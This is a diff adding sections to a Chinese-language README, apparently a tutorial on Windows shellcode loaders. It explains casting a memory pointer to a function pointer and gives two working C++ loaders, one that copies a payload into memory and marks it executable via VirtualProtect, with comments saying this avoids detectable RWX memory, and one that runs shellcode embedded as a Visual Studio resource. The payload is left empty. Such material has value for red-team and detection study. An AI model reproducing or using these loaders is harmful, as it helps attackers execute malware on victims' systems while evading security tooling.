@@ -130,3 +130,95 @@ int main(void) {
 
 ```
 
+
+
+### 函数指针转换执行shellcode
+
+其他步骤都一样，在执行shellcode时不使用CreateThread，使用(void(*)())exec_mem)();执行内存。
+
+让我们逐步解释这个表达式：
+
+- `(void(*)())`：这是一个类型转换操作符，用于将其后的表达式转换为指定的类型。在这里，`(void(*)())` 表示将表达式转换为一个函数指针类型。
+- `()`：表示一个函数调用运算符。在这个表达式中，我们没有提供任何函数名，而是在括号内使用了一个函数指针类型的转换操作。
+- `*`：表示指针。在函数指针类型中，`*` 用于表示一个指向函数的指针。
+- `void`：表示函数的返回类型。在这个表达式中，我们指定函数的返回类型为 `void`，表示函数不返回任何值。
+- `()`：表示函数的参数列表。在这个表达式中，空括号表示函数没有参数。
+
+因此，`(void(*)())` 表示一个没有参数并且返回类型为 `void` 的函数指针类型。
+
+整个表达式 `(void(*)())exec_mem` 将指向内存中机器码的指针 `exec_mem` 转换为一个函数指针，使得我们可以通过函数指针的方式调用内存中的机器码，即执行 shellcode。
+
+```c++
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(void) {
+    
+	void * exec_mem;
+	BOOL rv;
+	HANDLE th;
+  DWORD oldprotect = 0;
+
+	//shellcode在main函数内，存储在pe结构的sections table中的.text部分
+	unsigned char payload[] = {};
+	unsigned int payload_len = sizeof(payload);
+	
+	// 使用VirtualAlloc申请一个可读可写的内存，这里没有申请执行权限是为了防止出现RWX权限的敏感内存
+	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+	// 将shellcode复制到申请的内存中，这里还可以用memcpy等
+	RtlMoveMemory(exec_mem, payload, payload_len);
+	
+	// 使用VirtualProtect添加执行权限
+	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
+
+	// 如果返回正常，函数指针类型转换执行shellcode
+	if ( rv != 0 ) {
+			((void(*)())exec_mem)();
+	}
+
+	return 0;
+}
+
+```
+
+### 资源加载shellcode
+
+生成bin文件shellcode
+
+**VisualStudio->解决方案->资源文件->添加->资源**
+
+![image-20230419174631527](./README.assets/image-20230419174631527.png)
+
+导入-自定义资源类型
+
+![image-20230419174745700](./README.assets/image-20230419174745700.png)
+
+ctrl+s 保存
+
+![image-20230419174847116](./README.assets/image-20230419174847116.png)
+
+
+
+```c++
+#include"resource.h"
+#include <windows.h>
+#include<iostream>
+
+
+int main() {
+    {
+        HRSRC Res = FindResource(NULL, MAKEINTRESOURCE(IDR_BIN1), L"bin"); DWORD Size = SizeofResource(NULL, Res);
+        HGLOBAL Load = LoadResource(NULL, Res);
+        void* buffer = VirtualAlloc(0, Size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        memcpy(buffer, Load, Size);
+        ((void(*)())buffer)();
+
+    }
+
+}
+```
+
+64位release生成解决方案(shellcode位数要与release位数相同)
